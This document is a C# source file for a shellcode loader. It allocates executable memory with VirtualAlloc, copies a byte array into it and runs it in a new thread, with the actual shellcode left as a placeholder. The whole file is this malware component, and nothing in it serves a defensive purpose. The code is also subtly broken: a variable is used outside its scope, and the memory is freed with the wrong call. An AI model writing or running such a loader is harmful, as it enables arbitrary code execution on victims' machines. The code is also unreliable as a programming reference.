using System;
using System.Runtime.InteropServices;
using System.Security;

class ShellcodeLoader
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void LoadAndExecuteShellcode(byte[] shellcode)
    {
        try
        {
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
            if (addr == IntPtr.Zero)
            {
                throw new Exception("Failed to allocate memory");
            }

            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                throw new Exception("Failed to create thread");
            }

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
        finally
        {
            Marshal.FreeHGlobal(addr);
        }
    }
}

class Program
{
    public static void Main(string[] args)
    {
        byte[] shellcode = new byte[510] { /* ... Shellcode ... */ };
        ShellcodeLoader.LoadAndExecuteShellcode(shellcode);
    }
}
